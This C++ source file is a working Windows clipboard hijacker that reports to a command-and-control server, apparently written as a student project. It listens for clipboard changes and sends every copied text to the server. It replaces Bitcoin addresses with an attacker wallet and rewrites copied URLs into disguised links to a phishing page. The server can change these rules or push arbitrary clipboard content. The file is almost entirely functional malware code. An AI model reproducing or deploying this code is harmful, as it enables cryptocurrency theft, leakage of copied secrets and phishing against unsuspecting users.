#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <signal.h>
#include <thread>
#include <atomic>
#include <array>
#include <regex>
#include <iterator>

using namespace std;

#define PORT 8080
#define ADDRESS "127.0.0.1"
#define RETRY_INTERVAL 10000
#define CMD_BUFFER_SIZE 128
#define CLIP_BUFFER_SIZE 256
#define REPLACE_CHAR "[X]"

#define DEFAULT_WALLET "youvebeenpwned"
#define REG_URL R"(https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()!@:%_\+.~#?&\/\/=]*))"
#define REG_WALLET "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"

const string DEFAULT_URL = "@cgi.cse.unsw.edu.au/~z5476230/GooglePhishing/?" + string(REPLACE_CHAR);

// Function definitions
////////////////////////////////////////////////

void sendMsg(std::string message);
int getClipboardData(char *ret);
LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void clipboardUpdated();
void exitCleanup(int status);
void threadCleanup(std::thread &thread_obj, std::atomic<bool> &quitFlag);
int initCon();
void sighandler(int sig);
void handleCmd(string cmd);
void listenMsg(std::atomic<bool> &quitFlag);
void parseRules(string edit);
int startsWith(string s, string prefix);
void initRules();

//////////////////////////////////////////////

SOCKET sock;
int ownData = false;
bool debug = false;

struct Rule
{
  string label;
  string reg;
  string output;
  bool enabled;
};

std::array<Rule, 2> defaultRules = {{{"url", REG_URL, DEFAULT_URL, true},
                                     {"wallet", REG_WALLET, DEFAULT_WALLET, true}}};

std::array<Rule, 2> rules = defaultRules;

struct ClipboardData
{
  void *handle;
  int size;
  unsigned int format;
};

class Clipboard
{
public:
  static void open()
  {
    OpenClipboard(0);
  }

  static void close()
  {
    CloseClipboard();
  }

  static void empty()
  {
    EmptyClipboard();
  }

  static ClipboardData getData()
  {
    ClipboardData data;

    UINT uFormat = CF_TEXT;

    data.handle = GetClipboardData(uFormat);

    if (data.handle)
    {
      data.size = GlobalSize(data.handle);
      data.format = uFormat;
    }
    return data;
  }

  static void setData(void *dataHandle, UINT format)
  {
    SetClipboardData(format, dataHandle);
  }
};

int getClipboardData(char *ret)
{
  Clipboard::open();

  ClipboardData data = Clipboard::getData();

  if (data.handle)
  {
    char *clipboardText = static_cast<char *>(GlobalLock(data.handle));
    if (clipboardText)
    {
      memcpy(ret, clipboardText, CLIP_BUFFER_SIZE * sizeof(char));
    }
    GlobalUnlock(data.handle);
  }
  Clipboard::close();
  return 0;
}

void setClipboardData(char *payload)
{
  Clipboard::open();

  size_t len = strlen(payload) + 1;

  HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
  if (hMem)
  {
    memcpy(GlobalLock(hMem), payload, len);
    GlobalUnlock(hMem);

    Clipboard::empty();
    Clipboard::setData(hMem, CF_TEXT);
    ownData = true;
  }

  Clipboard::close();
}

// handle clipboard update
void clipboardUpdated()
{
  char ret[CLIP_BUFFER_SIZE];
  if (getClipboardData(ret) == 1)
  {
    return;
  }
  cout << ("clipboard updated\n");
  sendMsg("[update] " + string(ret));

  parseRules(string(ret));
}

// when clipboard updates, parses saved rules and replaces data
void parseRules(string edit)
{
  for (Rule rule : rules)
  {
    regex pattern(rule.reg);
    regex url_host("https?://[^/]*");
    smatch m;

    if (rule.enabled && regex_search(edit, m, pattern))
    {
      string original = edit;
      edit = regex_replace(edit, pattern, rule.output);

      // replace REPLACE_CHAR with original string
      size_t pos = edit.find(REPLACE_CHAR);

      while (pos != string::npos)
      {
        edit.replace(pos, strlen(REPLACE_CHAR), original);

        pos = edit.find(REPLACE_CHAR, pos + original.size());
      }
      // replace original url with hostname
      if (rule.label == "url")
      {
        if (regex_search(original, m, url_host))
        {
          edit = m.str(0) + edit;
        }
      }
      sendMsg("[rule] " + rule.label + " replaced");

      setClipboardData(edit.data());
      return;
    }
  }
}

// edit regex rules
void changeRule(string cmd)
{
  for (Rule &rule : rules)
  {
    if (startsWith(cmd, rule.label))
    {
      cmd.erase(0, rule.label.size() + strlen(" "));
      if (startsWith(cmd, "toggle"))
      {
        cmd.erase(0, strlen("toggle "));
        rule.enabled = startsWith(cmd, "true") ? true : false;
        sendMsg("[rule] " + rule.label + " rule toggled to " + (rule.enabled ? "on" : "off"));
      }
      if (startsWith(cmd, "output "))
      {
        cmd.erase(0, strlen("output "));
        rule.output = cmd;
        sendMsg("[rule] " + rule.label + " rule output set to " + rule.output);
      }
      Sleep(1000);
      initRules();
      break;
    }
  }
}

// reset rules to default
void resetRules()
{
  rules = defaultRules;
  initRules();
  sendMsg("[rule] rules reset to default");
}

// send rules as an update to server
void initRules()
{
  string msg = "[init] ";
  for (Rule rule : rules)
  {
    msg = msg + rule.label + " " + rule.reg + " " + rule.output + " " + (rule.enabled ? "true" : "false") + "\n";
  }
  sendMsg(msg);
}

// send notif to c2 server
void sendMsg(string msg)
{
  send(sock, msg.c_str(), msg.size(), 0);
}

// handles window messages for a window that listens for clipboard updates
LRESULT CALLBACK ClipWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  static BOOL bListening = FALSE;

  switch (uMsg)
  {
  case WM_CREATE:
    bListening = AddClipboardFormatListener(hWnd);
    return bListening ? 0 : -1;

  case WM_DESTROY:
    if (bListening)
    {
      RemoveClipboardFormatListener(hWnd);
      bListening = FALSE;
    }
    return 0;

  case WM_CLIPBOARDUPDATE:
    if (ownData)
    {
      ownData = false;
    }
    else
    {
      clipboardUpdated();
    }
    return 0;
  }

  return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

// cleanup stuff on exit
void exitCleanup(int status)
{
  cout << ("Exiting safely...\n");
  sendMsg("[exit]");
  closesocket(sock);
  WSACleanup();

  exit(status);
}

// cleans up threads
void threadCleanup(std::thread &thread_obj, std::atomic<bool> &quitFlag)
{
  quitFlag = true;
  if (thread_obj.joinable())
  {
    thread_obj.join();
  }
}

// initialises connection to c2 server
int initCon()
{
  // Initialize Winsock
  WSADATA wsa;
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
  {
    cout << ("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
    return 1;
  }

  // Create socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == INVALID_SOCKET)
  {
    cout << ("Could not create socket. Error Code: %d\n", WSAGetLastError());
    WSACleanup();
    return 1;
  }

  // Define the server address and port
  struct sockaddr_in server;
  server.sin_addr.s_addr = inet_addr(ADDRESS);
  server.sin_family = AF_INET;
  server.sin_port = htons(PORT);

  // Connect to the server
  if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
  {
    cout << ("Connection failed. Error Code: %d\n", WSAGetLastError());
    WSACleanup();
    return 1;
  }

  cout << ("Connected to the server!\n");
  initRules();
  return 0;
}

// listens for control c for program exit
void sighandler(int sig)
{
  cout << ("User exit.\n");
  exitCleanup(0);

  exit(sig);
}

// handles commands from c2 server
void handleCmd(string cmd)
{
  cout << cmd << "\n";
  if (startsWith(cmd, "[rule] "))
  {
    cmd.erase(0, strlen("[rule] "));
    changeRule(cmd);
  }
  if (startsWith(cmd, "[reset]"))
  {
    resetRules();
  }
  if (startsWith(cmd, "[replace] "))
  {
    cmd.erase(0, strlen("[replace] "));
    setClipboardData(cmd.data());
    sendMsg("[rule] regex replaced to '" + cmd + "'");
  }
}

int startsWith(string s, string prefix)
{
  return s.find(prefix) == 0;
}

// recieves commands from c2 server
void listenMsg(std::atomic<bool> &quitFlag)
{
  char buffer[CMD_BUFFER_SIZE];
  while (!quitFlag)
  {
    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);

    buffer[bytesReceived] = '\0';

    // condition for server disconnect
    if (bytesReceived <= 0 || strcmp(buffer, "[exit]") == 0)
    {
      // retry connection
      while (initCon() != 0)
      {
        cout << ("Retrying connection...\n");
        std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_INTERVAL));
      }
    }
    else
    {
      handleCmd(buffer);
    }
  }
}

int main()
{
  if (!debug)
  {
    cout.setstate(std::ios_base::failbit);
  }

  // window class registration
  WNDCLASSEXA wndClass = {sizeof(WNDCLASSEXA)};
  wndClass.lpfnWndProc = ClipWndProc;
  wndClass.lpszClassName = "ClipWnd";
  if (!RegisterClassExA(&wndClass))
  {
    cout << ("RegisterClassEx error 0x%08X\n", GetLastError());
    return 1;
  }

  // creating the window
  HWND hWnd = CreateWindowExA(0, wndClass.lpszClassName, "", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
  if (!hWnd)
  {
    cout << ("CreateWindowEx error 0x%08X\n", GetLastError());
    return 2;
  }

  // connect to the c2 server
  while (initCon() != 0)
  {
    cout << ("Server offline.\n");
    cout << ("Retrying connection...\n");
    std::this_thread::sleep_for(std::chrono::milliseconds(RETRY_INTERVAL));
  }

  // set up signal handlers for program exit (eg. control c)
  signal(SIGABRT, &sighandler);
  signal(SIGTERM, &sighandler);
  signal(SIGINT, &sighandler);

  // New thread for connection check
  std::atomic_bool quitFlag(false);
  std::thread thread_obj(listenMsg, std::ref(quitFlag));

  // message loop thread
  MSG msg;
  // retrieves messages from the message queue for the window
  while (BOOL bRet = GetMessage(&msg, 0, 0, 0))
  {
    if (bRet == -1)
    {
      cout << ("GetMessage error 0x%08X\n", GetLastError());

      threadCleanup(thread_obj, quitFlag);
      exitCleanup(1);
    }
    // translates virtual key messages into character messages.
    TranslateMessage(&msg);
    // DispatchMessage sends the message to the window procedure (ClipWndProc) for processing
    DispatchMessage(&msg);
  }

  threadCleanup(thread_obj, quitFlag);
  exitCleanup(0);

  return 0;
}